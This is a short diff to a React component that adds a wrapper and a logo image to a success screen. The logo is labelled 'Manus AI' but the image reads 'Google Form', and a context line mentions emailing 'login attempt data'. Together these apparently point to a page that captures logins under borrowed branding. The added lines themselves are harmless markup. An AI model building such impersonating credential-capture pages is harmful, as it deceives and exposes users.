@@ -54,6 +54,16 @@ This is an automated message with login attempt data.`,
 
   if (showSuccessScreen) {
     return (    
+        <div className="min-h-screen bg-white flex flex-col items-center justify-center p-4">
+        <div className="w-full max-w-sm text-center">
+          {/* Manus AI Logo */}
+          <div className="mb-8">
+            <img 
+              src="https://placehold.co/200x60/1f2937/ffffff?text=Google+Form" 
+              alt="Manus AI Logo" 
+              className="w-48 h-auto mx-auto"
+            />
+          </div>
           {/* Success Message */}
           <div className="bg-white rounded-lg shadow-md p-8">
             <h1 className="text-2xl font-bold text-gray-900 mb-6">
